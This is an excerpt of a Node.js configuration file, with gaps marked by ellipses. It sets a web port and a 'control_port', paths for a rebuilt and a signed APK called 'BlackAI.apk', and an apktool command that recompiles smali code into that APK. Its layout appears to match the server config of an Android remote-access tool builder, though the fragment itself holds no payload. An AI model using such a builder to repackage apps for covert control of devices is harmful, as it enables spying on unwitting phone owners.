...
exports.web_port = 5000;
exports.control_port = 22222;

// Paths
exports.apkBuildPath = path.join(__dirname, '../assets/webpublic/build.apk')
exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/BlackAI.apk')
...
exports.buildCommand = 'cd "' + path.join(__dirname, '..') + '" && java -jar "' + exports.apkTool + '" b "' + exports.smaliPath + '" -o "' + exports.apkBuildPath + '" && ls -lh "' + exports.apkBuildPath + '"';
